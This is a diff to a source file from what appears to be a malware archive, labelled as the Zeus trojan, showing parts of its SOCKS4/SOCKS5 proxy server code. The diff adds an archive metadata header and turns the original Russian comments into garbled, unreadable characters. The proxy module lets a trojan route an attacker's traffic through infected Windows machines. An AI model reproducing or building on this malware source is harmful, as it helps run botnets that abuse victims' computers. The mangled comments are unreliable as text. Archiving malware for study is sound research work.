@@ -1,3 +1,14 @@
+/*
+  name      Zeus
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <ws2tcpip.h>
 
@@ -64,19 +75,19 @@ void Socks5Server::uninit(void)
 }
 
 /*
-  Отправка ответа клиенту Socks5.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Socks5.
 
-  IN sourceSocket - сокет, на котоырй будет отправлен ответ.
-  IN nameSocket   - сокет, данные которого нужно получить или INVALID_SOCKET для ответе с IP и
-                    портом заполнинами нулями.
-  IN replyCode    - код ответа.
-  IN flags        - флаги S5_*.
+  IN sourceSocket - пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+  IN nameSocket   - пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ INVALID_SOCKET пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ IP пїЅ
+                    пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN replyCode    - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN flags        - пїЅпїЅпїЅпїЅпїЅ S5_*.
   
-  Return          - (-1) - в сулчаи ошибки получения данных об IP, ответ при этом не отправляется,
-                           и данное значение не возможно получить при
+  Return          - (-1) - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ IP, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                           пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
                            (nameSocket == INVALID_SOCKET),
-                      0  - в случаи ошибки в протоколе или разрыве соединения,
-                      1  - в случаи успешной отправки ответа.
+                      0  - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                      1  - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static int socks5Reply(SOCKET sourceSocket, SOCKET nameSocket, BYTE replyCode, DWORD flags)
 {
@@ -158,7 +169,7 @@ bool Socks5Server::_start5(SOCKET s, DWORD timeout)
   SOCKS5_QUERY sq;
   BYTE replyCode = 0; //successful
 
-  if(!WSocket::tcpRecvAll(s, &sq, sizeof(SOCKS5_QUERY), timeout) || sq.version != 5/*Ошибка протокола*/)return false;
+  if(!WSocket::tcpRecvAll(s, &sq, sizeof(SOCKS5_QUERY), timeout) || sq.version != 5/*пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ*/)return false;
 
   //Prioretet type IP when querying the DNS.
   int familyList[2];
@@ -212,7 +223,7 @@ bool Socks5Server::_start5(SOCKET s, DWORD timeout)
     {
       BYTE domain[MAXBYTE + 1];
       BYTE domainLen;
-      if(!WSocket::tcpRecvAll(s, &domainLen, sizeof(BYTE), timeout) || domainLen == 0 /*Ошибка протокола*/ ||
+      if(!WSocket::tcpRecvAll(s, &domainLen, sizeof(BYTE), timeout) || domainLen == 0 /*пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ*/ ||
          !WSocket::tcpRecvAll(s, domain, domainLen, timeout))return false;
 
       domain[domainLen] = 0;
@@ -260,7 +271,7 @@ IP_FOUNDED:
     return false;
   }
   
-  //if(replyCode == 0 && destAddr == NULL)иReplyCode = 1; //SOCKS-server error
+  //if(replyCode == 0 && destAddr == NULL)пїЅReplyCode = 1; //SOCKS-server error
   
   //Errors in the receipt of IP is not found, look team.
   bool retVal = true;
@@ -549,18 +560,18 @@ NEXT2:;
 }
 
 /*
-  Отправка ответа клиенту Socks4.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ Socks4.
 
-  IN sourceSocket  - сокет, на котоырй будет отправлен ответ.
-  IN nameSocket    - сокет, данные которого нужно получить или INVALID_SOCKET для ответе с IP и
-                     портом заполнинами нулями.
-  IN replyCode    - код ответа.
+  IN sourceSocket  - пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+  IN nameSocket    - пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ INVALID_SOCKET пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ IP пїЅ
+                     пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+  IN replyCode    - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 
-  Return           - (-1) - в сулчаи ошибки получения данных об IP, ответ при этом не отправляется,
-                            и данное значение не возможно получить при
+  Return           - (-1) - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ IP, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                            пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
                             (nameSocket == INVALID_SOCKET),
-                       0  - в случаи ошибки в протоколе или разрыве соединения,
-                       1  - в случаи успешной отправки ответа.
+                       0  - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+                       1  - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static int socks4Reply(SOCKET sourceSocket, SOCKET nameSocket, BYTE replyCode, DWORD flags)
 {
